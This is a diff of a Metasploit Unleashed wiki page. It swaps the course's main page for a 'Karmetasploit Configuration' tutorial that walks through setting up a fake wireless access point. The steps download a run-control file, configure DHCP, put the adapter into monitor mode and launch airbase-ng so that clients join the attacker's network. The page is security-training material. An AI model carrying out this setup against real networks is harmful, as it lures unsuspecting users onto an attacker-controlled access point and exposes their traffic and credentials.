@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Karmetasploit Configuration - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Karmetasploit_Configuration" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Karmetasploit_Configuration&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Karmetasploit_Configuration&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Karmetasploit_Configuration&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,279 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Karmetasploit Configuration</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Karmetasploit_Configuration#column-one">navigation</a>, <a href="Karmetasploit_Configuration#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>There is a bit of setup required to get Karmetasploit up and going. The first step is to obtain the run control file for Karmetasploit:
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>wget http://www.offensive-security.com/downloads/karma.rc</span>
+--2009-05-04 18:43:26--  http://metasploit.com/users/hdm/tools/karma.rc
+Resolving metasploit.com... 66.240.213.81
+Connecting to metasploit.com|66.240.213.81|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1088 (1.1K) [text/plain]
+Saving to: `karma.rc'
+
+100%[============================================================================>] 1,088       --.-K/s   in 0s     
+
+2009-05-04 18:43:27 (88.7 MB/s) - `karma.rc' saved [1088/1088]</pre>
+<br />
+Having obtained that requirement, we need to set up a bit of the infrastructure that will be required. When clients attach to the fake AP we run, they will be expecting to be assigned an IP address. As such, we need to put a DHCP server in place. Let's configure our 'dhcpd.conf' file.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>cat /etc/dhcp3/dhcpd.conf</span>
+option domain-name-servers 10.0.0.1;
+
+default-lease-time 60;
+max-lease-time 72;
+
+ddns-update-style none;
+
+authoritative;
+
+log-facility local7;
+
+subnet 10.0.0.0 netmask 255.255.255.0 {
+  range 10.0.0.100 10.0.0.254;
+  option routers 10.0.0.1;
+  option domain-name-servers 10.0.0.1;
+}</pre>
+<br />
+Then we need to install a couple of requirements.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>gem install activerecord sqlite3-ruby</span>
+Successfully installed activerecord-2.3.2
+Building native extensions.  This could take a while...
+Successfully installed sqlite3-ruby-1.2.4
+2 gems installed
+Installing ri documentation for activerecord-2.3.2...
+Installing ri documentation for sqlite3-ruby-1.2.4...
+Installing RDoc documentation for activerecord-2.3.2...
+Installing RDoc documentation for sqlite3-ruby-1.2.4...</pre>
+<br />
+Now we are ready to go. First off, we need to restart our wireless adapter in monitor mode. To do so, we first stop the interface, then use airmon-ng to restart it in monitor mode. Then, we utilize airbase-ng to start a new network.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>airmon-ng</span>
+
+
+Interface    Chipset        Driver
+
+wifi0        Atheros        madwifi-ng
+ath0         Atheros        madwifi-ng VAP (parent: wifi0)
+
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>airmon-ng stop ath0</span>
+
+
+Interface    Chipset        Driver
+
+wifi0        Atheros        madwifi-ng
+ath0         Atheros        madwifi-ng VAP (parent: wifi0) (VAP destroyed)
+
+
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>airmon-ng start wifi0</span>
+
+
+Found 3 processes that could cause trouble.
+If airodump-ng, aireplay-ng or airtun-ng stops working after
+a short period of time, you may want to kill (some of) them!
+-e
+PID     Name
+5636    NetworkManager
+5641    wpa_supplicant
+5748    dhclient3
+
+
+Interface    Chipset        Driver
+
+wifi0        Atheros        madwifi-ngError for wireless request "Set Frequency" (8B04) :
+    SET failed on device ath0 ; No such device.
+ath0: ERROR while getting interface flags: No such device
+
+ath1         Atheros        madwifi-ng VAP (parent: wifi0)
+
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>airbase-ng -P -C 30 -e "U R PWND" -v ath1</span>
+For information, no action required: Using gettimeofday() instead of /dev/rtc
+22:52:25  Created tap interface at0
+22:52:25  Trying to set MTU on at0 to 1500
+22:52:25  Trying to set MTU on ath1 to 1800
+22:52:25  Access Point with BSSID 00:1A:4D:49:0B:26 started.</pre>
+<br />
+Airbase-ng has created a new interface for us, at0. This is the interface we will now utilize. We will now assign ourselves an IP address and start up our DHCP server listening on our new interface.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</span>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</span>
+Internet Systems Consortium DHCP Server V3.1.1
+Copyright 2004-2008 Internet Systems Consortium.
+All rights reserved.
+For info, please visit http://www.isc.org/sw/dhcp/
+Wrote 0 leases to leases file.
+Listening on LPF/at0/00:1a:4d:49:0b:26/10.0.0/24
+Sending on   LPF/at0/00:1a:4d:49:0b:26/10.0.0/24
+Sending on   Socket/fallback/fallback-net
+Can't create PID file /var/run/dhcpd.pid: Permission denied.
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>ps aux | grep dhcpd</span>
+dhcpd     6490  0.0  0.1   3812  1840 ?        Ss   22:55   0:00 dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
+root      6493  0.0  0.0   3232   788 pts/0    S+   22:55   0:00 grep dhcpd</pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; <a href="Karmetasploit" title="Karmetasploit">Karmetasploit</a> &gt; Karmetasploit Configuration</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="http://www.offensive-security.com/w/index.php?title=Configuration&amp;action=edit&amp;redlink=1" class="new" title="Configuration (page does not exist)">Configuration</a> &#124; <a href="Karmetasploit_In_Action" title="Karmetasploit In Action">Karmetasploit In Action</a> &#124; <a href="Attack_Analysis" title="Attack Analysis">Attack Analysis</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 516/1000000
+Preprocessor generated node count: 2697/1000000
+Post‐expand include size: 4734/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:110-0!*!0!*!*!*!* and timestamp 20131124135821 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Karmetasploit_Configuration&amp;oldid=1545">http://www.offensive-security.com/w/index.php?title=Karmetasploit_Configuration&amp;oldid=1545</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Karmetasploit&amp;action=edit&amp;redlink=1" class="new" title="Category:Karmetasploit (page does not exist)">Karmetasploit</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +764,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.139 secs. --></body></html>
